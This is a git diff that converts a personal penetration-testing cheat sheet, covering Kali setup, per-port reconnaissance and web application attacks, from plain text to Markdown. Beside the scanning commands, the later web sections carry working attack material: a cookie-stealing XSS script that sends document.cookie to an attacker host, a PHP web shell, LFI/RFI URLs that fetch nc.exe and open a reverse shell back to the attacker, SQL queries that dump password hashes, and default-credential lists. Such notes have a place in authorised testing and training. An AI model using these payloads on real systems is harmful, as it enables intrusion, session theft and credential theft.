@@ -60,6 +60,10 @@ Running as root and downgrading to reg user to run FireFox
 2. `su newuser -c firefox`
 3. `xhost -`
 
+Setting Up Git
+1. `git config --global user.name "username"`
+2. `git config --global user.email "123455-the-no-reply-email-from-git"`
+
 ### Setting up Non-Root Kali (Older versions)
 
 #### To Run in Completely Different User Account
@@ -177,18 +181,21 @@ Connect to the target port of suspected web server
 
 One liner: `echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80`
 
-
 What about 443????
 
 `openssl s_client -connect $tgt:443`
 
-### Break Down of Recon Per Port/Service
+#### netcat cycle through ports.... poorman's scanner. It outputs in stderr so
+
+`nc -nvv -w 1 -z $tgt 1-65535 2>&1 | tee nc_scan.txt`
+
+## Break Down of Recon Per Port/Service
 
 Example of finding an nmap script and learning how to use it. Example smtp: `ls /usr/share/nmap/scripts/*smtp*`
 
 See what you want and most likely the author explains how to use it: `less /usr/share/nmap/scripts/smtp-enum-users.nse`
 
-#### 21- ftp
+### 21- ftp
 
 Look for: OS version, FTP Version, misconfigured permissions (whole hd?)
 
@@ -199,7 +206,7 @@ There are nmap scripts to do this for you
 
 `nmap --script=`
 
-#### 22 - ssh
+### 22 - ssh
 
 Look for: SSH Version (hint at OS?)
 
@@ -207,14 +214,14 @@ Look for: SSH Version (hint at OS?)
 - `nc -nvv $tgt 22`
 - `nmap --script=`
 
-#### 23 - telnet
+### 23 - telnet
 
 Look for: Version (hint at OS?)
 
 - `telnet root@$tgt`
 - `nmap --script=`
 
-#### 25 - smtp
+### 25 - smtp
 
 Look for Version, User enumeration
 
@@ -222,54 +229,86 @@ Look for Version, User enumeration
 - A list at a time: `for name in $(cat userlist.txt); do echo -e "VRFY root \r" | nc -nv $tgt 25; done`
 - `nmap --script=/usr/share/nmap/scripts/smtp-enum-users.nse`
 
-#### 53 - DNS
+### 53 - DNS
 
 Look for: Version (hint at OS and infrastructure), Zone XFR
 
-#### 80 - http
+### 80 - http
 
-SEC LISTS = https://github.com/danielmiessler/SecLists.git
-or
-`apt-get install seclists`
+**Enumeration Only; Web App Attacks Later in Guide**
 
-Look for:  Webserver version (Apache 2.34 etc.) AND Web Application Version (WordPress?), Server date time, Options allowed
+[SEC LISTS](https://github.com/danielmiessler/SecLists.git) or `apt-get install seclists`
 
-- Application version `amap $tgt 80`
+Look for:
+- Webserver version (Apache 2.34 etc.) **AND** Web Application Version (WordPress?)
+	- OS Type and Version
+	- Application Type and Version
+	- Server date time
+	- Options allowed
+	- Code it is running? It it Server or Client Side code: PHP | Java | APX?
+
+Identify the HTTP Server Version
+- One liner netcat banner grab `echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80 | tee banner.txt`
+- Curl just the headers: `curl -I http://$tgt:80/ |tee headers.txt`
+- Msfconsole
+	1. use auxiliary/scanner/http/http_version
+	2. set RHOSTS $tgt
+	3. run
+
+Identify the Web Application
 - Web App Vuln Scanner: `nikto -host $tgt -port $tgtPort`
-- Pull it down as text `curl -v http://$tgt/webpage`
-- One liner netcat banner grab `echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80`
-- Curl just the headers: `curl -I http://$tgt:3000/`
 
-##### Dirbuster
+Identify Both the Application and the Server
+- Application Mapper `amap $tgt 80`
+- View the page and look for information leakage
+	- Curl it `curl -v http://$tgt/webpage | tee webpage.curl`
+	- wget it `wget “http://$tgt/index”`
+	- CLI Graphical Browser `browsh --startup-url $tgt` and `CTRL + q` to quit
+	- Lynx, a highly effecient CLI text browser `lynx http://$tgt`
 
-- Start crawling the site for sites: `dirb http://$tgt/ |-o dirb-$portNum.out`
+#### Mapping of Directories
+
+MSFConsole
+- use auxiliary/scanner/http/brute_dirs
+- set RHOSTS $tgt
+- run
+
+Dirbuster
+- Use MSF Dir List with dirb `dirb http://$tgt /usr/share/metasploit-framework/data/wordlists/directory.txt`
+- Start crawling the site for Directories: `dirb http://$tgt/ |-o dirb-$portNum.out`
 - Now check for files and end points: `dirb http://$tgt/ -X .htm,.html,.php |tee dirb-$portNum-files.out`
 
-##### Java Web Token (JWT )Recce and Attacks
-
-Try to auth with JWT with curl:
-- `curl -H 'Accept: application/json' -H "Authorization: Bearer ${TOKEN}" https://{hostname}/api/myresource`
-- `curl -H 'Accept: application/json' -H "Authorization: Bearer ${token}" http://$tgt:3000/users/`
-
-##### Initial Sweep of the website (Directory Busting) with Go Buster
+Go Buster (Another Dir Buster)
 - `gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://$tgt/`
 - `gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://$tgt`
 - `gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out`
 
+#### Mapping of Pages
+
 Confirm hidden pages
+- CGI's are gold here
 
 `gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e`
 
-#### 135 - RPC
+#### Check Robots.txt
+
+MSFConsole
+1. use auxiliary/scanner/http/robots_txt
+2. set RHOSTS 192.30.247.3
+3. run
+
+Manually with curl `curl http://$tgt/robots.txt |tee robots.txt`
+
+### 135 - RPC
 
 See what remote clients can interact with
 
 `showmount -e $tgt`
 
-#### 139 - Netbios
+### 139 - Netbios
 
 
-#### 161 - snmp
+### 161 - snmp
 Look for:  If this pops it dumps a TON of OS info and user info
 
 Can also allow you to WRITE configs into the device... looking at you Cisco
@@ -278,61 +317,52 @@ snnpwalk ???
 snmpcheck ???
 nmap --script=
 
--------------------------------------------
-443 - ssl
+### 443 - ssl
 openssl s_client -connect $tgt:443
 
+### 445 SMB
+What can we mount unathenticated with Null Sessions?
 
--------------------------------------------
-445 SMB
-# What can we mount unathenticated with Null Sessions?
-# Do we have creds to enum that users shares?
+Do we have creds to enum that users shares?
 
-# Check null
+#### Check null
 smbclient -L \\\\$tgt -N
 
-# Mount Up...
-smbclient ////TARGET/Backups -I $tgt -N
-#or
-mount -t cifs //$tgt ip/Backups /media/ -o username=NULL
+#### Mount Up...
 
--------------------------------------------
-1433 - SQL
+`smbclient ////TARGET/Backups -I $tgt -N`
 
-	----#MS-SQL-S -----
-nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 $tgt
+or
 
-#To interact with the DB directly.  Default Admin name is SA.
-# Install Impacket: https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
-mssqlclient.py -p 1433 -db DMBNAME -windows-auth USER@10.10.10.10
+`mount -t cifs //$tgt ip/Backups /media/ -o username=NULL`
 
-# http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/
+### 1433 - SQL
 
-# List all DB
-SELECT name FROM master..sysdatabases;
+`nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 $tgt`
 
-# See columns for a table
-SELECT * FROM information_schema.columns WHERE table_name='master'
+To interact with the DB directly.  Default Admin name is SA.
+- Install Impacket: [Impacket Github](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
+- `mssqlclient.py -p 1433 -db DMBNAME -windows-auth USER@10.10.10.10`
 
-# Determine current DB
-SELECT DB_NAME();
+[SQLI Guide by Travis Altman](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)
 
-# Dump Admin Users
-select loginname from syslogins where sysadmin = 1
+List all DB: `SELECT name FROM master..sysdatabases;`
 
-# Dump usernames and hashes
-select name, password_hash FROM master.sys.sql_logins
+See columns for a table: `SELECT * FROM information_schema.columns WHERE table_name='master'`
 
+Determine current DB: `SELECT DB_NAME();`
 
--------------------------------------------
-3000 - JS Query API
-#confirm what it is powered by
-curl -I http://$tgt:3000/
+Dump Admin Users: `select loginname from syslogins where sysadmin = 1`
 
+Dump usernames and hashes: `select name, password_hash FROM master.sys.sql_logins`
 
+### 3000 JWT QUERY API
 
--------------------------------------------
+Confirm what it is powered by
 
+`curl -I http://$tgt:3000/`
+
+Move on to JWT Attacks below
 
 ## Follow On Enumeration
 
@@ -343,9 +373,6 @@ enum4linux -a -v $tgt |tee enum4linux-a-v.out
 ********************************************************
 Scanning Misc.
 ********************************************************
-# netcat cycle through ports.... poorman's scanner. It outputs in stderr so
-# redirect stderr to std out (2>&1)=
-nc -nvv -w 1 -z $tgt 1-65535 2>&1 | tee nc_scan.txt
 
 #snmp-check- mad loot if the target offers snmp with a public string
 snmp-check $tgt
@@ -376,125 +403,151 @@ nmap -p 139,445 --script s,b-enum-users $tgt
 
 unicornscan -i tap0 -E -m U $tgt:a > unicornUDPfull
 
-#Check if a website is running something like PHP
-wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://$tgt/FUZZ.php
+******************
 
-#FUZZ is how wfuzz knows where to ... fuzz
+## WEB APP Testing
 
-==========================================================================================
-			     WEB APP ATTACKS  --Goal:
+**Goals**:
 1. Web Server Software/Version
 2. Web Application Software/Version
 3. SQLI?
 4. Vulns
-==========================================================================================
-#Good, quick and dirty enum
-curl -i http://$tgt:80/
-
-#Initial Sweep of the website (Directory Busting)
-gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out
-
-#Confirm hidden pages
-gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e
-
-#wfuzz taken from pentesterlab.com sqli to shell
-#wfuzz -c output with colors; -z file,[wordlist]; -hc 404 -ignore the 404's; http://$target/FUZZ - fuzz tells fuzz where to brute
-$ python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ
-#wfuzz to detect php on the server
-$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php
-
 
 LOOK UP AND TRY DEFAULT CREDS!!!
 
-#Standard check for XSS vulnerability
+Good, quick and dirty enum: `curl -i http://$tgt:80/`
+
+Initial Sweep of the website (Directory Busting): `gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out`
+
+Confirm hidden pages: `gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e`
+
+### wfuzz taken from pentesterlab.com sqli to shell
+
+|Switch|Function|
+|---|---|
+|-c|Output with colors|
+|-z|Wordlist file|
+|-hc 404|Ignore 404's|
+|FUZZ|Tells Wfuzz where in the URL to fuzz/brute|
+
+`python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ`
+
+wfuzz to detect php on the server
+```bash
+python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php
+```
+### JWT (Java Web Token)Attacks
+
+Try to auth with JWT with curl:
+```bash
+curl -H 'Accept: application/json' -H "Authorization: Bearer ${TOKEN}" https://{hostname}/api/myresource
+```
+```bash
+curl -H 'Accept: application/json' -H "Authorization: Bearer ${token}" http://$tgt:3000/users/
+```
+
+### Helpful Code Snippets
+
+Standard check for XSS vulnerability
+```java
 <script>alert("XSS")</script>
+```
 
-#?
+Iframe Injection
+```html
 <iframe SRC="http://$me/report" height = "0" width ="0"></iframe>
+```
 
-#Grab a cookie....
+Grab a cookie....
+```java
 <script>
 new Image().src="http://$me:81/bogus.php?output="+document.cookie;
 </script>
+```
 
-#Standard quick and dirty php shell
+### Backdoor One Liners
+
+Standard quick and dirty php shell
+```php
 <?php echo shell_exec($_GET['cmd']);?>
+```
 
 LANG=../../../../../../../xampp/apache/logs/access.log%00
 
-****************************************
-LFI and RFI
-*****************************************
+### LFI and RFI
 
 LFI Move nc.exe to target:
-$tgt/addguestbook.php?name=badDude&comment=pwnU&cmd=tftp%20-i%20$me%20get%20nc.exe&LANG=../apache/logs/access.log%00
+
+`$tgt/addguestbook.php?name=badDude&comment=pwnU&cmd=tftp%20-i%20$me%20get%20nc.exe&LANG=../apache/logs/access.log%00`
 
 LFI Have nc.exe to call home:
-http://$tgt/addguestbook.php?name=badDude&comment=pwnU&cmd=nc%20-nv%20$me%20443%20-e%20cmd.exe&LANG=../apache/logs/access.log%00
+
+`http://$tgt/addguestbook.php?name=badDude&comment=pwnU&cmd=nc%20-nv%20$me%20443%20-e%20cmd.exe&LANG=../apache/logs/access.log%00`
 
 RFI to Move nc.exe to target:
-http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%00
+
+`http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%00`
 
 RFI to have nc.exe call home:
-http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%00
+
+`http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%00`
 
 LFI vs RFI Command Input:
-LFI will execute the CMD found in the command line; enabled by the php 'cmd' variable injected into the logs
-RFI will execute the CMD found in the "evil.txt" found in the evil.txt hosted on the attack machine
+1. LFI will execute the CMD found in the command line; enabled by the php 'cmd' variable injected into the logs
+2. RFI will execute the CMD found in the "evil.txt" found in the evil.txt hosted on the attack machine
 
-===========================================================================================
-JSON / JQUERY Rest API on port 3000...  
-===========================================================================================
-# Find what its powered by.... Probably Express... see if the Response Headers are there as a tab
-curl -I http://$tgt:3000/
+### JSON / JQUERY Rest API on port 3000...  
 
+Find what its powered by.... Probably Express... see if the Response Headers are there as a tab
 
+`curl -I http://$tgt:3000/`
 
-==========================================================================================
-WORDPRESS
-==========================================================================================
-# Default Creds Admin Admin
-# location of passwords: /var/www/wordpress/wp-config.php
+### WORDPRESS
 
-# WP Scanner
+Default Creds Admin:Admin
+
+location of passwords: /var/www/wordpress/wp-config.php
+
+#### WP Scanner
 ??
-==========================================================================================
-				DEF CREDS - Try font door anytime you find it
-==========================================================================================
+
+### DEF CREDS - Try font door anytime you find it
 Wordpress
-admin admin
+- admin:admin
 
 vsFTPd 2.3.4
-anonymous
-*blank*
+- anonymous:\*blank\*
 
 ORACLE isql
-SYSTEM SYSTEM
+- SYSTEM:SYSTEM
 
-Default Usernames and Passwords
+### Default Usernames and Passwords Sites
 
-CIRT
-http://www.cirt.net/passwords
+[CIRT](http://www.cirt.net/passwords)
 
-Government Security - Default Logins and Passwords for Networked Devices
+[Government Security - Default Logins and Passwords for Networked Devices](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)
 
-http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php
+[Virus.org](http://www.virus.org/default-password/)
 
-Virus.org
-http://www.virus.org/default-password/
+[Default Password](http://www.defaultpassword.com/)
 
-Default Password
-http://www.defaultpassword.com/
+### SQL Injection
 
-============================================================================================
-				                    SHELLS
-============================================================================================
-##nc shell upgrade to /bin/bash/
-python -c "import pty;pty.spawn('/bin/bash');"
-python3 -c "import pty;pty.spawn('/bin/bash');"
+[SQLI Guide by Travis Altman](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)
 
+## SHELLS
 
-<?php echo shell_exec($_GET['cmd']);?>
+nc shell upgrade to /bin/bash/
+
+`python -c "import pty;pty.spawn('/bin/bash');"`
+
+Py3
+
+`python3 -c "import pty;pty.spawn('/bin/bash');"`
+
+PHP
+
+`<?php echo shell_exec($_GET['cmd']);?>`
 
 
 ============================================================================================
